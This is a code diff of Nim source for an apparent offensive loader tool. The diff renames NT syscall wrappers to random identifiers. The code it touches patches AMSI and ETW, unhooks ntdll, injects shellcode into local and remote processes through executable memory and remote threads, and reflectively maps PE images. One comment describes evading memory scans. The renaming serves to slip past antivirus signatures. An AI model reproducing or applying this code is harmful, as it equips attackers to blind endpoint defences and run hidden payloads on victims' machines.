@@ -61,7 +61,7 @@ proc PatchAmsi(): bool =
         buffer          : LPVOID
 
 
-    status = NtPVM(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+    status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to change memory protections.")
@@ -72,15 +72,15 @@ proc PatchAmsi(): bool =
         bytesWritten: SIZE_T
 
     var outLength: SIZE_T
-    status = NtWVM(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
+    status = oqiazasusjk(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to write memory.")
     else:
-        echo obf("[+] NtWVM Succeed!")
+        echo obf("[+] oqiazasusjk Succeed!")
                 
                
-    status = NtPVM(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+    status = uashdiasdj(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to allocate memory.")
@@ -138,21 +138,21 @@ proc Patchntdll(): bool =
     var protectAddress = cs
 
     var friendlycodeLength = cast[SIZE_T](patch.len)
-    success = NtPVM(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
+    success = uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
     if (success != 0):
-        echo obf("NtPVM failed")
+        echo obf("uashdiasdj failed")
         return disabled
     echo obf("[*] Applying Syscall (SysWhispers) ETW patch")
     var outLength: SIZE_T
     
-    success = NtWVM(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
+    success = oqiazasusjk(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
     
     if (success != 0):
-        echo obf("NtWVM failed")
+        echo obf("oqiazasusjk failed")
         return disabled
-    success =  NtPVM(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
+    success =  uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
     if (success != 0):
-        echo obf("NtPVM failed")
+        echo obf("uashdiasdj failed")
         return disabled
     else:
         echo obf("[*] OldProtect set back")
@@ -222,17 +222,17 @@ proc ntdllunhook(): bool =
           var bytesWritten: SIZE_T
           var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
           var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
-          status = NtPVM(processH, &ds, &pSize, 0x40, &oldProtection)
+          status = uashdiasdj(processH, &ds, &pSize, 0x40, &oldProtection)
           if status != 0:
-            echo obf("[!] NtPVM failed to modify memory permissions:") & fmt"{GetLastError()}."
+            echo obf("[!] uashdiasdj failed to modify memory permissions:") & fmt"{GetLastError()}."
             return false
-          status = NtWVM(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
+          status = oqiazasusjk(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
           if status != 0:
-            echo obf("[!] NtWVM failed to write bytes to target address:") & fmt"{GetLastError()}."
+            echo obf("[!] oqiazasusjk failed to write bytes to target address:") & fmt"{GetLastError()}."
             return false
-          status = NtPVM(processH, &ds, &pSize, oldProtection, &oldProtection2)
+          status = uashdiasdj(processH, &ds, &pSize, oldProtection, &oldProtection2)
           if status != 0:
-            echo obf("[!] NtPVM failed to reset memory back to it's orignal protections:") & fmt"{GetLastError()}."
+            echo obf("[!] uashdiasdj failed to reset memory back to it's orignal protections:") & fmt"{GetLastError()}."
             return false
   status = zuatzuastdiasyy(processH)
   status = zuatzuastdiasyy(ntdllFile)
@@ -269,7 +269,7 @@ proc pwndemWhispersLike[byte](friendlycode: openarray[byte]): void =
             dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)
 
 
-        status = NtAVM(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+        status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                 
         if not NT_SUCCESS(status):
             echo obf("[-] Failed to allocate memory.")
@@ -279,12 +279,12 @@ proc pwndemWhispersLike[byte](friendlycode: openarray[byte]): void =
         var 
             bytesWritten: SIZE_T
 
-        status = NtWVM(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
+        status = oqiazasusjk(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
 
         if not NT_SUCCESS(status):
             echo obf("[-] Failed to write memory.")
         else:
-            echo obf("[+] NtWVM - wrote bytes ") & fmt"{bytesWritten}"
+            echo obf("[+] oqiazasusjk - wrote bytes ") & fmt"{bytesWritten}"
                 
             
         let f = cast[proc(){.nimcall.}](buffer)
@@ -320,36 +320,36 @@ proc remoteLoadAmsi(processID: var DWORD): bool =
     cid.UniqueProcess = processID
 
     
-    status = NtOP(
+    status = opqiwepoausdasdjl(
         &pHandle,
         PROCESS_ALL_ACCESS, 
         &oa, &cid         
     )
 
-    echo obf("[*] NtOP: "), status
+    echo obf("[*] opqiwepoausdasdjl: "), status
 
 
-    status = NtAVM(
+    status = oqiahsjynmxkla(
         pHandle, &ds, 0, &sc_size, 
         MEM_COMMIT, 
         PAGE_EXECUTE_READWRITE)
-    echo obf("[*] NtAVM: "), status
+    echo obf("[*] oqiahsjynmxkla: "), status
     var bytesWritten: SIZE_T
 
 
-    status = NtWVM(
+    status = oqiazasusjk(
         pHandle, 
         ds, 
         unsafeAddr friendlycode, 
         sc_size-1, 
         addr bytesWritten)
 
-    echo obf("[*] NtWVM: "), status
+    echo obf("[*] oqiazasusjk: "), status
     echo obf("    \\-- bytes written: "), bytesWritten
     echo obf("")
 
     var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
-    status = NtCTE(
+    status = zuq8aztsdztausdgbh(
         &tHandle, 
         THREAD_ALL_ACCESS, 
         NULL, 
@@ -358,8 +358,8 @@ proc remoteLoadAmsi(processID: var DWORD): bool =
         ds, FALSE, 0, 0, 0, NULL)
 
 
-    status = NtCl(tHandle)
-    status = NtCl(pHandle)
+    status = zuatzuastdiasyy(tHandle)
+    status = zuatzuastdiasyy(pHandle)
     if(status == 0):
       return true
     else:
@@ -398,7 +398,7 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
         buffer          : LPVOID
 
 
-    status = NtPVM(hProcss, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+    status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to allocate memory.")
@@ -409,14 +409,14 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
         bytesWritten: SIZE_T
 
     var outLength: SIZE_T
-    status = NtWVM(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
+    status = oqiazasusjk(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to write memory.")
     else:
-        echo obf("[+] NtWVM Succeed!")
+        echo obf("[+] oqiazasusjk Succeed!")
                 
-    status = NtPVM(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+    status = uashdiasdj(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to allocate memory.")
@@ -461,36 +461,36 @@ proc remoteLoadNtdll(processID: var DWORD): bool =
     cid.UniqueProcess = processID
 
     
-    status = NtOP(
+    status = opqiwepoausdasdjl(
         &pHandle,
         PROCESS_ALL_ACCESS, 
         &oa, &cid         
     )
 
-    echo obf("[*] NtOP: "), status
+    echo obf("[*] opqiwepoausdasdjl: "), status
 
 
-    status = NtAVM(
+    status = oqiahsjynmxkla(
         pHandle, &ds, 0, &sc_size, 
         MEM_COMMIT, 
         PAGE_EXECUTE_READWRITE)
-    echo obf("[*] NtAVM: "), status
+    echo obf("[*] oqiahsjynmxkla: "), status
     var bytesWritten: SIZE_T
 
 
-    status = NtWVM(
+    status = oqiazasusjk(
         pHandle, 
         ds, 
         unsafeAddr friendlycode, 
         sc_size-1, 
         addr bytesWritten)
 
-    echo obf("[*] NtWVM: "), status
+    echo obf("[*] oqiazasusjk: "), status
     echo obf("    \\-- bytes written: "), bytesWritten
     echo obf("")
 
     var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
-    status = NtCTE(
+    status = zuq8aztsdztausdgbh(
         &tHandle, 
         THREAD_ALL_ACCESS, 
         NULL, 
@@ -499,8 +499,8 @@ proc remoteLoadNtdll(processID: var DWORD): bool =
         ds, FALSE, 0, 0, 0, NULL)
 
 
-    status = NtCl(tHandle)
-    status = NtCl(pHandle)
+    status = zuatzuastdiasyy(tHandle)
+    status = zuatzuastdiasyy(pHandle)
     if(status == 0):
       return true
     else:
@@ -538,7 +538,7 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
         buffer          : LPVOID
 
 
-    status = NtPVM(hProcess, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+    status = uashdiasdj(hProcess, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to allocate memory.")
@@ -549,15 +549,15 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
         bytesWritten: SIZE_T
 
     var outLength: SIZE_T
-    status = NtWVM(hProcess,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
+    status = oqiazasusjk(hProcess,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to write memory.")
     else:
-        echo obf("[+] NtWVM Succeed!")
+        echo obf("[+] oqiazasusjk Succeed!")
                 
 
-    status = NtPVM(hProcess,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+    status = uashdiasdj(hProcess,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to allocate memory.")
@@ -626,36 +626,36 @@ let WhispersShellcoderemoteinjectStub * = """
     var success: BOOL
 
     
-    status = NtOP(
+    status = opqiwepoausdasdjl(
         &pHandle,
         PROCESS_ALL_ACCESS, 
         &oa, &cid         
     )
 
-    echo obf("[*] NtOP: "), status
+    echo obf("[*] opqiwepoausdasdjl: "), status
 
 
-    status = NtAVM(
+    status = oqiahsjynmxkla(
         pHandle, &ds, 0, &sc_size, 
         MEM_COMMIT, 
         PAGE_EXECUTE_READWRITE)
-    echo obf("[*] NtOP: "), status
+    echo obf("[*] opqiwepoausdasdjl: "), status
     var bytesWritten: SIZE_T
 
 
-    status = NtWVM(
+    status = oqiazasusjk(
         pHandle, 
         ds, 
         unsafeAddr friendlycode, 
         sc_size-1, 
         addr bytesWritten)
 
-    echo obf("[*] NtWVM: "), status
+    echo obf("[*] oqiazasusjk: "), status
     echo obf("    \\-- bytes written: "), bytesWritten
     echo obf("")
 
 
-    status = NtCTE(
+    status = zuq8aztsdztausdgbh(
         &tHandle, 
         THREAD_ALL_ACCESS, 
         NULL, 
@@ -664,8 +664,8 @@ let WhispersShellcoderemoteinjectStub * = """
         NULL, FALSE, 0, 0, 0, NULL)
 
 
-    status = NtCl(tHandle)
-    status = NtCl(pHandle)
+    status = zuatzuastdiasyy(tHandle)
+    status = zuatzuastdiasyy(pHandle)
 
     echo success
    
@@ -902,9 +902,9 @@ proc pwndem(): void =
     var ds: LPVOID
 
 
-    var status: NTSTATUS = NtAVM(pHandle2, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE)
+    var status: NTSTATUS = oqiahsjynmxkla(pHandle2, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE)
     
-    echo obf("NtAVM:")
+    echo obf("oqiahsjynmxkla:")
     echo status
     
     
@@ -915,9 +915,9 @@ proc pwndem(): void =
     ntHeader.OptionalHeader.ImageBase = cast[ULONGLONG](preferAddr)
     
     var bytesWritten: SIZE_T
-    status = NtWVM(pHandle2,preferAddr,shellcodePtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
+    status = oqiazasusjk(pHandle2,preferAddr,shellcodePtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
     
-    echo obf("NtWVM:")
+    echo obf("oqiazasusjk:")
     echo status
     
     
@@ -926,8 +926,8 @@ proc pwndem(): void =
     while i < cast[int](ntHeader.FileHeader.NumberOfSections):
       var dest: LPVOID = (preferAddr + SectionHeaderArr[i].VirtualAddress)
       var source: LPVOID = (shellcodePtr + SectionHeaderArr[i].PointerToRawData)
-      status = NtWVM(pHandle2,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
-      echo obf("NtWVM for section: "), toString(SectionHeaderArr[i].Name)
+      status = oqiazasusjk(pHandle2,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
+      echo obf("oqiazasusjk for section: "), toString(SectionHeaderArr[i].Name)
       echo status
       inc(i)
     
@@ -946,9 +946,9 @@ proc pwndem(): void =
       op: ULONG
       t: ULONG
     # Setting the protection to PAGE_NOACCESS afterwards could bypass in memory scans if the execution was completed fast enough.
-    status =  NtPVM(pHandle2,addr protectAddress,addr allocsize,0x01,addr op)
+    status =  uashdiasdj(pHandle2,addr protectAddress,addr allocsize,0x01,addr op)
     if (status != 0):
-        echo obf("NtPVM failed")
+        echo obf("uashdiasdj failed")
         echo status
         echo GetLastError()
     else:
